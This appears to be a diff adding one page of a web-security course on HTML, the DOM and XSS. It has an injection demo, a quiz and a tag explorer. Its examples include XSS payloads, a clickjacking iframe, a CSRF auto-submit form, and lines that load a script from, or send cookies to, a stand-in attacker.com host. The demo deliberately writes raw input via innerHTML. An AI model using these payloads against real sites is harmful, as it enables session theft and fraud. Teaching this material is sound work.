+      <div style="font-size:0.8rem; color:var(--text-muted); margin-bottom:0.75rem; text-transform:uppercase; letter-spacing:0.06em;">
+        🧪 Payloads to try
+      </div>
+      <div style="display:flex; flex-wrap:wrap; gap:0.5rem;">
+        <button class="ed-btn ed-btn-reset" onclick="setPayload('<b>bold text</b>')"><code>&lt;b&gt;bold&lt;/b&gt;</code></button>
+        <button class="ed-btn ed-btn-reset" onclick="setPayload('<h1>Injected!</h1>')"><code>&lt;h1&gt;Injected!&lt;/h1&gt;</code></button>
+        <button class="ed-btn ed-btn-reset" onclick="setPayload('<img src=x onerror=alert(1)>')"><code>&lt;img onerror&gt;</code></button>
+        <button class="ed-btn ed-btn-reset" onclick="setPayload('<a href=javascript:alert(2)>Click me</a>')"><code>&lt;a href=javascript:&gt;</code></button>
+      </div>
+      <p style="font-size:0.8rem; color:var(--text-muted); margin-top:0.75rem; margin-bottom:0;">
+        ⚠️ Note: the <code>alert()</code> payloads will only work in the injection demo, not inside the code editors — this is intentional sandbox behaviour.
+      </p>
+    </div>
+
+    <div class="callout warning" style="margin-top:1rem;">
+      <div class="callout-title">⚠️ What just happened?</div>
+      When you injected <code>&lt;b&gt;bold&lt;/b&gt;</code>, the browser rendered it as bold text —
+      it treated your input as real HTML, not as plain text.
+      This is the core of HTML injection and XSS: the browser cannot tell the difference
+      between HTML the developer wrote and HTML an attacker injected.
+      In Module 3 you will see how this leads to full JavaScript execution.
+    </div>
+
+
+    <!-- ══ QUIZ ══ -->
+    <div class="quiz-section">
+      <div class="quiz-header">
+        <div>
+          <h3>🧠 Knowledge Check</h3>
+          <p>4 questions · Select your answer and click Check</p>
+        </div>
+      </div>
+      <div class="quiz-body">
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="quiz-q"><span class="q-num">1</span>
+            A penetration tester finds that a website puts a user's search term directly inside an HTML attribute like this: <code>&lt;input value="SEARCH_TERM"&gt;</code>. What is the simplest way to break out and inject code?
+          </div>
+          <div class="quiz-options">
+            <label class="quiz-option"><input type="radio" name="q1" value="a"> Add a <code>&lt;script&gt;</code> tag at the start</label>
+            <label class="quiz-option"><input type="radio" name="q1" value="b"> Use a double quote <code>"</code> to close the attribute, then add an event handler</label>
+            <label class="quiz-option"><input type="radio" name="q1" value="c"> Submit the form with an empty value</label>
+            <label class="quiz-option"><input type="radio" name="q1" value="d"> Change the HTTP method from GET to POST</label>
+          </div>
+          <div class="quiz-feedback" id="fb1"></div>
+          <button class="quiz-submit" onclick="checkQ(1,'b','Correct! A double quote closes the value attribute. Then you can add onclick=&quot;alert(1)&quot; or any other event handler. This is attribute injection XSS — one of the most common real-world techniques.','Not quite. The key insight is that the input is inside an HTML attribute delimited by quotes. A double quote character closes that attribute, letting you inject new attributes like event handlers.')">Check Answer</button>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="quiz-q"><span class="q-num">2</span>
+            Which of the following HTML tags can execute JavaScript WITHOUT using a <code>&lt;script&gt;</code> tag?
+          </div>
+          <div class="quiz-options">
+            <label class="quiz-option"><input type="radio" name="q2" value="a"> <code>&lt;p&gt;</code></label>
+            <label class="quiz-option"><input type="radio" name="q2" value="b"> <code>&lt;div&gt;</code></label>
+            <label class="quiz-option"><input type="radio" name="q2" value="c"> <code>&lt;img src=x onerror=alert(1)&gt;</code></label>
+            <label class="quiz-option"><input type="radio" name="q2" value="d"> <code>&lt;h1&gt;</code></label>
+          </div>
+          <div class="quiz-feedback" id="fb2"></div>
+          <button class="quiz-submit" onclick="checkQ(2,'c','Correct! The img tag with an onerror event handler executes JavaScript when the image fails to load. This is a classic script-less XSS payload used to bypass filters that only block the word script.','Not quite. The img tag with onerror=alert(1) triggers JavaScript execution when the image src fails to load — no script tag required. This is key for bypassing XSS filters.')">Check Answer</button>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="quiz-q"><span class="q-num">3</span>
+            What is the DOM?
+          </div>
+          <div class="quiz-options">
+            <label class="quiz-option"><input type="radio" name="q3" value="a"> A type of database used by web servers</label>
+            <label class="quiz-option"><input type="radio" name="q3" value="b"> The tree structure the browser builds from HTML, which JavaScript can read and modify</label>
+            <label class="quiz-option"><input type="radio" name="q3" value="c"> The CSS styling rules applied to a webpage</label>
+            <label class="quiz-option"><input type="radio" name="q3" value="d"> The HTTP response headers sent by the server</label>
+          </div>
+          <div class="quiz-feedback" id="fb3"></div>
+          <button class="quiz-submit" onclick="checkQ(3,'b','Correct! The DOM (Document Object Model) is the browser\'s in-memory tree representation of the HTML document. JavaScript uses it to read and modify the page. XSS attacks work by using JavaScript to manipulate the DOM maliciously.','Not quite. The DOM — Document Object Model — is the tree structure the browser builds from HTML. JavaScript interacts with the DOM to read values, update content, and respond to user actions.')">Check Answer</button>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="quiz-q"><span class="q-num">4</span>
+            A developer uses <code>charset="UTF-8"</code> in the HTML head. Why does this matter for security?
+          </div>
+          <div class="quiz-options">
+            <label class="quiz-option"><input type="radio" name="q4" value="a"> It makes the page load faster</label>
+            <label class="quiz-option"><input type="radio" name="q4" value="b"> It prevents the browser from running JavaScript</label>
+            <label class="quiz-option"><input type="radio" name="q4" value="c"> It helps prevent encoding-based attacks where characters are disguised using alternative character sets</label>
+            <label class="quiz-option"><input type="radio" name="q4" value="d"> It encrypts the HTML before sending it to the browser</label>
+          </div>
+          <div class="quiz-feedback" id="fb4"></div>
+          <button class="quiz-submit" onclick="checkQ(4,'c','Correct! Without a declared charset, some browsers may try to auto-detect the encoding. Attackers have historically exploited this to disguise XSS payloads using alternative encodings (e.g. UTF-7). Declaring UTF-8 explicitly removes this ambiguity.','Not quite. Declaring charset=UTF-8 forces the browser to interpret the page using a known encoding, which prevents encoding-based XSS bypasses that rely on the browser misinterpreting characters.')">Check Answer</button>
+        </div>
+
+      </div>
+      <div class="quiz-score" id="quizScore">
+        <div class="score-number" id="scoreNum"></div>
+        <div class="score-label"  id="scoreLabel"></div>
+      </div>
+    </div>
+
+
+    <!-- ══ BOTTOM NAV ══ -->
+    <div class="bottom-nav">
+      <a class="btn-back" href="1-1.html">← 1.1 From URL to Webpage</a>
+      <div class="complete-badge" id="completeBadge">✅ Sub-module complete</div>
+      <a class="btn-next" href="1-3.html">Next: 1.3 Forms &amp; User Input →</a>
+    </div>
+
+  </div>
+
+
+  <!-- ══ JAVASCRIPT ══ -->
+  <script>
+
+    // ── Editors ──
+    const defaults = {
+      ed1: `<!DOCTYPE html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8">\n    <title>My First Page</title>\n  </head>\n  <body>\n    <h1>Hello, Security Student!</h1>\n    <p>Try changing this text and clicking Run.</p>\n  </body>\n</html>`,
+      ed2: `<!-- A heading element -->\n<h1>This is a heading</h1>\n\n<!-- A paragraph element -->\n<p>This is a paragraph of text.</p>\n\n<!-- An element WITH attributes -->\n<a href="https://www.google.com" target="_blank">\n  Click this link\n</a>\n\n<!-- An image element (self-closing) -->\n<img src="https://placecats.com/100/60" alt="A cat">\n\n<!-- Try adding your own element below! -->`
+    };
+
+    function runEditor(id) {
+      const code = document.getElementById(id).value;
+      const iframe = document.getElementById(id + '-preview');
+      iframe.srcdoc = code;
+    }
+
+    function resetEditor(id) {
+      document.getElementById(id).value = defaults[id];
+      runEditor(id);
+    }
+
+    // Auto-run on load
+    window.addEventListener('load', () => {
+      runEditor('ed1');
+      runEditor('ed2');
+    });
+
+    // ── HTML Injection Demo ──
+    function runInjection() {
+      const val = document.getElementById('injInput').value;
+      const escaped = val.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+      document.getElementById('injSource').innerHTML =
+        `&lt;p&gt;Welcome, <span style="color:var(--red)">${escaped}</span>&lt;/p&gt;`;
+      document.getElementById('injOutput').innerHTML = `Welcome, ${val}`;
+    }
+
+    function resetInjection() {
+      document.getElementById('injInput').value = '';
+      document.getElementById('injSource').innerHTML =
+        `&lt;p&gt;Welcome, <span style="color:var(--red)">[your input goes here]</span>&lt;/p&gt;`;
+      document.getElementById('injOutput').innerHTML =
+        `Welcome, <em style="color:#999">[your input goes here]</em>`;
+    }
+
+    function setPayload(payload) {
+      document.getElementById('injInput').value = payload;
+      runInjection();
+    }
+
+    // ── Tag Explorer ──
+    const tagData = {
+      script: {
+        name: '<script>', risk: 'high',
+        desc: 'Embeds or loads JavaScript. This is the primary XSS injection vector. If an attacker can insert a script tag into a page, they have full control over the browser in that page\'s context.',
+        example: '<!-- Direct execution -->\n<script>alert("XSS")</script>\n\n<!-- Load external script -->\n<script src="https://attacker.com/steal.js"></script>'
+      },
+      iframe: {
+        name: '<iframe>', risk: 'high',
+        desc: 'Embeds another webpage inside the current one. Used in clickjacking (overlaying an invisible iframe over a button to trick users into clicking it) and as an XSS payload delivery mechanism.',
+        example: '<!-- Clickjacking setup -->\n<iframe src="https://bank.com/transfer"\n        style="opacity:0; position:absolute;\n               top:0; left:0; width:100%; height:100%">\n</iframe>'
+      },
+      img: {
+        name: '<img>', risk: 'high',
+        desc: 'Images are one of the most common script-less XSS vectors. The onerror event fires when the image fails to load — and executes any JavaScript you put there. No script tag needed.',
+        example: '<!-- Classic XSS without script tag -->\n<img src="x" onerror="alert(\'XSS\')">\n\n<!-- Load a resource to track visits -->\n<img src="https://attacker.com/track?cookie="+document.cookie>'
+      },
+      svg: {
+        name: '<svg>', risk: 'high',
+        desc: 'SVG is an XML-based image format that supports embedded JavaScript via event handlers. Often used to bypass XSS filters because filters may not expect JavaScript inside an SVG element.',
+        example: '<!-- SVG XSS bypass -->\n<svg onload="alert(1)">\n  <circle cx="50" cy="50" r="40"/>\n</svg>'
+      },
+      a: {
+        name: '<a>', risk: 'high',
+        desc: 'Links can execute JavaScript using the javascript: URL scheme in the href attribute. Used in phishing and XSS. Modern browsers restrict this in some contexts, but it still works in many.',
+        example: '<!-- JavaScript URI XSS -->\n<a href="javascript:alert(\'XSS\')">Click me</a>\n\n<!-- Open redirect -->\n<a href="https://attacker.com">Click here for prize</a>'
+      },
+      form: {
+        name: '<form>', risk: 'medium',
+        desc: 'Forms send data to a server. Attackers inject forms to perform CSRF (Cross-Site Request Forgery) attacks — tricking users into submitting requests to other sites without knowing it.',
+        example: '<!-- Auto-submitting CSRF form -->\n<form action="https://bank.com/transfer"\n      method="POST" id="csrf">\n  <input name="amount" value="1000">\n  <input name="to" value="attacker">\n</form>\n<script>document.getElementById("csrf").submit()</script>'
+      },
+      input: {
+        name: '<input>', risk: 'medium',
+        desc: 'Input fields are the most common entry points for XSS and injection attacks. The value, placeholder, and name attributes are all potential injection points if the server reflects them back unsanitized.',
+        example: '<!-- Attribute injection via value -->\n<input value="" onmouseover="alert(1)">\n\n<!-- Hidden inputs can still be manipulated -->\n<input type="hidden" name="role" value="user">'
+      },
+      div: {
+        name: '<div>', risk: 'low',
+        desc: 'A generic container element. Not dangerous on its own, but commonly used to hold injected content. If innerHTML is used to write to a div, any HTML including scripts will execute.',
+        example: '<!-- Safe -->\n<div id="output"></div>\n\n<!-- Dangerous if innerHTML is used -->\n<script>\n  document.getElementById("output").innerHTML = userInput;\n</script>'
+      },
+      span: {
+        name: '<span>', risk: 'low',
+        desc: 'An inline container. Like div, not dangerous on its own — but dangerous if its content is set via innerHTML rather than textContent.',
+        example: '<!-- Safe way to display user input -->\n<span id="name"></span>\n<script>\n  document.getElementById("name").textContent = userInput;\n</script>'
+      },
+      meta: {
+        name: '<meta>', risk: 'medium',
+        desc: 'Provides metadata about the page. The http-equiv attribute can simulate HTTP headers and cause redirects. If an attacker can inject a meta refresh tag, they can redirect users to a phishing site.',
+        example: '<!-- Meta redirect injection -->\n<meta http-equiv="refresh"\n      content="0; url=https://phishing-site.com">\n\n<!-- Correct security usage -->\n<meta charset="UTF-8">\n<meta http-equiv="Content-Security-Policy"\n      content="default-src \'self\'">'
+      }
+    };
+
+    function showTag(id) {
+      const d = tagData[id];
+      const riskLabel = d.risk === 'high' ? 'High Risk' : d.risk === 'medium' ? 'Medium Risk' : 'Low Risk';
+      const riskClass = `risk-${d.risk}`;
+      document.querySelectorAll('.tag-chip').forEach(c => c.classList.remove('active'));
+      event.target.classList.add('active');
+      const detail = document.getElementById('tagDetail');
+      detail.innerHTML = `
+        <h4>${d.name} <span class="risk-badge ${riskClass}">${riskLabel}</span></h4>
+        <p>${d.desc}</p>
+        <pre>${d.example}</pre>`;
+      detail.classList.add('show');
+    }
+
+    // ── DOM Tree Tooltips ──
+    const nodeTips = {
+      document: { title: 'document', text: 'The root of the DOM. Everything lives inside this object. JavaScript accesses it via the global document variable — e.g. document.getElementById(), document.cookie.' },
+      html:     { title: '<html>', text: 'The root HTML element. Parent of both <head> and <body>. The lang attribute here affects character encoding behaviour.' },
+      head:     { title: '<head>', text: 'Contains metadata not visible on the page: title, charset, CSS links, and script tags. Script tags here execute before the body renders.' },
+      title:    { title: '<title>', text: 'The text shown in the browser tab. Also indexed by search engines. In a pentest, check for reflected XSS here — some filters miss the title tag.' },
+      body:     { title: '<body>', text: 'Everything the user sees. This is where HTML injection and XSS payloads are rendered. Most injection points are inside the body.' },
+      h1:       { title: '<h1>', text: 'A heading element. If user input is reflected inside a heading without sanitization, HTML injection is possible here too.' },
+      form:     { title: '<form action="/submit">', text: 'Forms send user data to the server. The action attribute defines where. This is an injection entry point — what the user types gets sent to the server.' },
+      input:    { title: '<input type="text" name="q">', text: '🚨 This is where user input enters the page. If the server takes this value and puts it back into HTML without sanitizing, XSS is possible. This is the start of the attack chain.' }
+    };
+
+    function showNodeTip(id) {
+      const t = nodeTips[id];
+      if (!t) return;
+      const tip = document.getElementById('nodeTooltip');
+      tip.innerHTML = `<div class="nt-title">${t.title}</div><p>${t.text}</p>`;
+      tip.classList.add('show');
+    }
+
+    function hideNodeTip() {
+      document.getElementById('nodeTooltip').classList.remove('show');
+    }
+
+    // ── Quiz ──
+    let answered = {};
+    const correctAnswers = { 1:'b', 2:'c', 3:'b', 4:'c' };
+
+    function checkQ(qNum, correct, feedbackCorrect, feedbackWrong) {
+      if (answered[qNum]) return;
+      const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
+      if (!selected) { alert('Please select an answer first.'); return; }
+      answered[qNum] = true;
+      const isCorrect = selected.value === correct;
+      const fb = document.getElementById(`fb${qNum}`);
+      document.querySelectorAll(`input[name="q${qNum}"]`).forEach(input => {
+        const label = input.closest('.quiz-option');
+        label.classList.add('disabled');
+        if (input.value === correct) label.classList.add('correct');
+        else if (input.checked)      label.classList.add('wrong');
+      });
+      fb.textContent = isCorrect ? '✅ ' + feedbackCorrect : '❌ ' + feedbackWrong;
+      fb.className = `quiz-feedback show ${isCorrect ? 'correct' : 'wrong'}`;
+      document.querySelectorAll(`#q${qNum} .quiz-submit`)[0].disabled = true;
+      if (Object.keys(answered).length === 4) showScore();
+    }
+
+    function showScore() {
+      let correct = 0;
+      for (let q in correctAnswers) {
+        const sel = document.querySelector(`input[name="q${q}"]:checked`);
+        if (sel && sel.value === correctAnswers[q]) correct++;
+      }
+      document.getElementById('scoreNum').textContent = `${correct} / 4`;
+      document.getElementById('scoreLabel').textContent =
+        correct === 4 ? '🎉 Perfect! Move on to Sub-module 1.3.' :
+        correct >= 3  ? '👍 Good work! Review what you missed.' :
+                        '📖 Review the section above before continuing.';
+      document.getElementById('quizScore').classList.add('show');
+      markVisited('1-2');
+      document.getElementById('completeBadge').classList.add('show');
+    }
+
+    function markVisited(id) {
+      let visited = JSON.parse(localStorage.getItem('wsec_visited') || '[]');
+      if (!visited.includes(id)) { visited.push(id); localStorage.setItem('wsec_visited', JSON.stringify(visited)); }
+    }
+
+    window.addEventListener('load', () => markVisited('1-2'));
+
+  </script>
+
+</body>
+</html>
